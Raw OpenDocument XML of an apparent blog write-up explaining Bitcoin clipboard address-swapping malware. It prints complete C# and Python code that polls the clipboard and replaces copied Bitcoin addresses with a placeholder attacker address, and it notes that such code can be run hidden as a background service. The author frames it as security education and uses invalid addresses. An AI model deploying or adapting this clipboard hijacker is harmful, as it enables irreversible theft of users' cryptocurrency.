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390000024F91B7A1E0C85E3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Table1.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.0104in" fo:border="none" fo:wrap-option="wrap"/>
    </style:style>
    <style:style style:name="Table1.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.0104in" fo:border="none" fo:wrap-option="wrap"/>
    </style:style>
    <style:style style:name="Table1.B2"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Normal">
      <style:text-properties officeooo:rsid="000c5d6d" officeooo:paragraph-rsid="000c5d6d"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
      <style:text-properties officeooo:rsid="000c5d6d" officeooo:paragraph-rsid="000c5d6d"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
      <style:text-properties officeooo:rsid="000c83da" officeooo:paragraph-rsid="000c83da"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" officeooo:rsid="000c83da" officeooo:paragraph-rsid="000c83da" style:font-size-asian="10.5pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" officeooo:rsid="000c83da" officeooo:paragraph-rsid="00115003" style:font-size-asian="10.5pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" officeooo:rsid="000d9433" officeooo:paragraph-rsid="000d9433" style:font-size-asian="9.14999961853027pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" officeooo:rsid="000d9433" officeooo:paragraph-rsid="00106d45" style:font-size-asian="9.14999961853027pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000c83da" officeooo:paragraph-rsid="000c83da" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000c83da" officeooo:paragraph-rsid="000c83da" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000d9433" officeooo:paragraph-rsid="000d9433" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P12"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0c5d6d" officeooo:paragraph-rsid="000c5d6d" style:font-name-asian="Times New Roman" style:font-size-asian="18pt" style:font-style-asian="normal" style:font-name-complex="Times New Roman" style:font-size-complex="18pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-top="0.2075in" fo:margin-bottom="0.2075in" style:contextual-spacing="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:language="none" fo:country="none" fo:font-style="normal" style:font-name-asian="Times New Roman" style:font-style-asian="normal" style:font-name-complex="Times New Roman" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-top="0.2075in" fo:margin-bottom="0.2075in" style:contextual-spacing="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:language="none" fo:country="none" fo:font-style="normal" officeooo:rsid="000c5d6d" officeooo:paragraph-rsid="000c5d6d" style:font-name-asian="Times New Roman" style:font-style-asian="normal" style:font-name-complex="Times New Roman" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="000d9433" officeooo:paragraph-rsid="000d9433"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:paragraph-properties fo:margin-top="0.1953in" fo:margin-bottom="0.1953in" style:contextual-spacing="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:language="none" fo:country="none" fo:font-style="normal" officeooo:rsid="000c5d6d" officeooo:paragraph-rsid="000c5d6d" style:font-name-asian="Times New Roman" style:font-style-asian="normal" style:font-name-complex="Times New Roman"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Normal" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="000c83da" officeooo:paragraph-rsid="000c83da" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="000c83da" officeooo:paragraph-rsid="000c83da" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Normal">
      <style:paragraph-properties fo:margin-top="0.1665in" fo:margin-bottom="0in" style:contextual-spacing="false" fo:line-height="100%"/>
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d9433" officeooo:paragraph-rsid="000d9433"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0c83da"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="000d9433"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="00115003"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="0016864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ddrJack – a Bitcoin Address-Swapping Malware Demo <text:span text:style-name="T9">(Code Companion)</text:span></text:h>
      <table:table table:name="Table1" table:style-name="Table1">
        <table:table-column table:style-name="Table1.A"/>
        <table:table-column table:style-name="Table1.B"/>
        <table:table-row table:style-name="TableLine140326253442016">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P1">Author</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B1" office:value-type="string">
            <text:p text:style-name="Normal">josh</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableLine140324911109152">
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P1">Date</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.B2" office:value-type="string">
            <text:p text:style-name="P2">2022-10-12</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:h text:style-name="P13" text:outline-level="2">Overview</text:h>
      <text:p text:style-name="P3">A while back, I published a short, soundless demo of a Bitcoin address-swapping malware called AddrJack. Address-swapping malware are simple but insidious, and I’ve encountered real cryptocurrency users that have lost coins to this attack. Let’s dive into what address-swapping (or address-stealing) malware is, and how I coded up a simple demo of this attack.</text:p>
      <text:h text:style-name="P14" text:outline-level="2">Address-Swapping Malware Basics</text:h>
      <text:h text:style-name="P16" text:outline-level="3">How Does This Attack Work?</text:h>
      <text:p text:style-name="P3">Stealing cryptocurrency with an address-swapper is fairly straightforward. A victim of this attack will have malware installed on their system; something that runs in the background and looks for cryptocurrency addresses. The process scans the <text:span text:style-name="T1">clipboard buffer</text:span><text:span text:style-name="T3">, an operating-system dependent data structure looking at the information stored. </text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">The malware code looks for string data that matches a Bitcoin </text:span><text:span text:style-name="T1">address</text:span><text:span text:style-name="T3"> using a common programming tool – a </text:span><text:span text:style-name="T1">regular expression.</text:span><text:span text:style-name="T3"> If the data matches the </text:span><text:span text:style-name="T1">regular expression</text:span><text:span text:style-name="T3"> of a Bitcoin address, the code changes the </text:span><text:span text:style-name="T1">clipboard buffer</text:span><text:span text:style-name="T3"> to contain the address of the </text:span><text:span text:style-name="T4">attacker/thief</text:span><text:span text:style-name="T2">. </text:span><text:span text:style-name="T5">When the user pastes the address, they may not notice that the address belongs to the attacker instead of the intended recipient. They send cryptocurrency to the attacker instead of their desired wallet. The coins now belong to the thief!</text:span></text:p>
      <text:h text:style-name="P14" text:outline-level="2">Address-Stealing Code</text:h>
      <text:p text:style-name="P3">Writing up a demo of this <text:span text:style-name="T6">concept is actually remarkably simple. Real-world malware is likely more sophisticated to avoid detection, but this demo gets the point across for education. My original AddrJack demo is coded in C#, a language that runs on the .NET framework. This primarily targets Windows, but can also run on other platforms via the Mono framework. I have coded a second demo of this using Python, a simple-to-use and platform-independent scripting language. This Python demo can also run on Windows or other OSs. </text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Let’s take a look at some definitions first:</text:p>
      <text:p text:style-name="P5">static void Main()</text:p>
      <text:p text:style-name="P5"><text:s text:c="8"/>{</text:p>
      <text:p text:style-name="P5"><text:s text:c="12"/>string malicious = "1fakedontsendinvalidmfBsbif4miY36v";</text:p>
      <text:p text:style-name="P5"><text:s text:c="12"/>string malicious_segwit = "3fakedontsendinvalidmfBsbif4miY36v";</text:p>
      <text:p text:style-name="P5"><text:s text:c="7"/><text:tab/>string bitcoin_regex_def = @"^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$";</text:p>
      <text:p text:style-name="P5"><text:s text:c="12"/>Regex bitcoin_regex = new Regex(bitcoin_regex_def);</text:p>
      <text:p text:style-name="P9">This block of code defines some important constants for our demo. The first is our malicious address, which will be swapped in place of the user’s intended address. This is not actually a valid BTC address – I want it to be obvious that our demo user has been “hacked” and avoid any actual theft of BTC. The goal is education, not theft! This block defines a legacy and segwit address. </text:p>
      <text:p text:style-name="P9">The next part is very important – our <text:span text:style-name="T1">regular expression</text:span><text:span text:style-name="T3"> that detects a Bitcoin address. Our background process will be processing lots of different text data while our “victim” uses their PC. We don’t want random filenames, webpage URLs, etc. to be swapped out with a Bitcoin address – this will make the PC unusable and our attack very obvious. We only want to detect and swap </text:span><text:span text:style-name="T1">Bitcoin addresses.</text:span><text:span text:style-name="T3"> This regular expression matches a string that fits the Bitcoin base58check address format:</text:span></text:p>
      <text:list xml:id="list2176736820" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P17">[13] – means our string starts with a 1 or a 3</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17">[a-km-zA-HJ-NP-Z0-9] - The middle characters match valid base58 chars</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17">{26,33} – The string is 26 to 33 characters in length (after the 1 or 3)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P18">Next, we will poll the clipboard in an infinite loop, checking every half second:</text:p>
      <text:p text:style-name="P6">while (true)<text:line-break/>{<text:line-break/><text:tab/>tr<text:span text:style-name="T8">y<text:line-break/><text:tab/></text:span>{<text:line-break/><text:tab/><text:tab/>if (Clipboard.ContainsText())<text:line-break/><text:tab/><text:tab/>{<text:line-break/><text:tab/><text:tab/><text:tab/>string user_data = Clipboard.GetText();<text:line-break/><text:tab/><text:tab/><text:tab/>if (bitcoin_regex.IsMatch(user_data))<text:line-break/><text:tab/><text:tab/><text:tab/>{<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/>if (user_data.StartsWith("3"))<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/>{<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>Clipboard.SetText(malicious_segwit);<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/>}<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/>else</text:p>
      <text:p text:style-name="P6"><text:soft-page-break/><text:s/><text:tab/><text:tab/><text:tab/><text:tab/>{<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>Clipboard.SetText(malicious);<text:line-break/><text:tab/><text:tab/><text:tab/><text:tab/>}<text:line-break/><text:tab/><text:tab/><text:tab/>}<text:line-break/><text:tab/><text:tab/>}<text:line-break/><text:tab/>}<text:line-break/><text:tab/>catch (Exception e)<text:line-break/><text:tab/>{<text:line-break/><text:tab/><text:tab/>// Something went wrong, just wait until the next go-around<text:line-break/><text:tab/>}<text:line-break/><text:line-break/><text:tab/>Thread.Sleep(500);<text:line-break/>}</text:p>
      <text:p text:style-name="P10">First, our loop checks if there is text data in the clipboard. If there is indeed data in the clipboard, we check that data matches a Bitcoin address using our regular expression. This code intelligently checks if it’s a legacy (1) address or (3) segwit address. It then puts our malicious address into the clipboard, overwriting the user’s intended address.</text:p>
      <text:p text:style-name="P11">It’s equally simple to code up this sort of thing in Python:</text:p>
      <text:p text:style-name="P7">import re<text:line-break/>import pyperclip<text:line-break/>import time</text:p>
      <text:p text:style-name="P7"># Define some constants for our demo<text:line-break/>BITCOIN_REGEX_DEF = "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$"<text:line-break/>MALICIOUS = "1fakedontsendinvalidmfBsbif4miY36v"<text:line-break/><text:line-break/># The main entry point for the program<text:line-break/>def main():<text:line-break/><text:tab/>while(True):<text:line-break/><text:tab/><text:tab/># Fetch the current clipboard data<text:line-break/><text:tab/><text:tab/>data = pyperclip.paste()</text:p>
      <text:p text:style-name="P8"><text:s text:c="4"/><text:tab/><text:tab/># Check if the data matches a Bitcoin address format<text:line-break/><text:tab/><text:tab/>if re.match(BITCOIN_REGEX_DEF, data):<text:line-break/><text:tab/><text:tab/><text:tab/>pyperclip.copy(MALICIOUS) <text:s text:c="3"/></text:p>
      <text:p text:style-name="P7"><text:s text:c="4"/><text:tab/><text:tab/>time.sleep(0.5)</text:p>
      <text:p text:style-name="P11">The pyperclip documentation notes that this module works with Windows and Mac OSX – and there are several other libraries that allow this code to work on Linux. </text:p>
      <text:p text:style-name="P11">In terms of running this undercover on a user system, one would want this to run as a background process or system service, rather than in a command-interpreter window. </text:p>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:width="6.5in" svg:height="3.5528in" draw:z-index="0"><draw:image xlink:href="Pictures/10000001000004390000024F91B7A1E0C85E3B26.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:soft-page-break/></text:p>
      <text:h text:style-name="P15" text:outline-level="2">Simple and Insidious Address-Stealing Attacks</text:h>
      <text:p text:style-name="P10">If the user is about to do a Bitcoin transaction, pastes the malicious address, and doesn’t actually double check – they will send their coins to the attacker instead! <text:span text:style-name="T7">Since Bitcoin transactions are irreversible, the thief now owns those coins and the user will be unable to retrieve their money. </text:span></text:p>
      <text:p text:style-name="P11">The code for this is remarkably simple, and the attack insidious. It took me about 30 minutes to code up a simple example in C#, and even less in Python. I may consider writing this demo in other languages in the future. </text:p>
      <text:p text:style-name="P11">This demonstrates the importance of keeping a system malware-free and <text:span text:style-name="T4">always </text:span><text:span text:style-name="T5">double and triple checking addresses before completing a transaction. Once the coins are sent, there is no chargeback mechanism. <text:s/></text:span></text:p>
      <text:p text:style-name="P19">Of course this goes without saying, but I’ll be explicit – stealing is wrong. This code is intended to be educational. Try coding your own, show others, and spread security awareness instead of using this for malicious purposes. We all grow through edu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4.1$MacOSX_X86_64 LibreOffice_project/27d75539669ac387bb498e35313b970b7fe9c4f9</meta:generator>
    <dc:title>Hex Encoding, Version Prefixes, and Keccak (uBitAddr Code Companion Update)</dc:title>
    <meta:initial-creator/>
    <meta:editing-cycles>8</meta:editing-cycles>
    <dc:date>2022-10-12T16:20:18.232795645</dc:date>
    <meta:editing-duration>PT39M6S</meta:editing-duration>
    <meta:document-statistic meta:table-count="1" meta:image-count="1" meta:object-count="0" meta:page-count="4" meta:paragraph-count="41" meta:word-count="921" meta:character-count="6068" meta:non-whitespace-character-count="5029"/>
  </office:meta>
</office:document-meta>
</file>